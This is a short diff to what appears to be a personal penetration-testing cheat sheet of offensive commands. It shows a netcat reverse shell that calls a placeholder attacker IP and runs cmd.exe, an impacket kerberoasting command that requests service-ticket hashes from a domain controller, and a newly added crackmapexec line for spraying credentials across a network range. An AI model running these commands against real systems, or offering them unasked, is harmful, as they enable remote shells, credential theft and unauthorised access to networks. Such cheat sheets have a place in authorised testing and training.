@@ -259,3 +259,8 @@ nc.exe <ATTACKER IP> <PORT> –e cmd.exe
 
 # windows - active directory - kerberoasting - getting ST (service tickets) associated with user SPNs (service principal names)
 impacket-GetUserSPNs -outputfile <DOMAIN>-spns.hashes -request -dc-ip <IP> <DOMAIN>/<USER>:<PASSWORD>
+
+# scanning - crackmapexec - checking credentials against a network
+crackmapexec <SERVICE> <IP RANGE> -u <USER> -p '<PASSWORD>' | tee crackmapexec_<SERVICE>_<USER>_creds.out
+
+
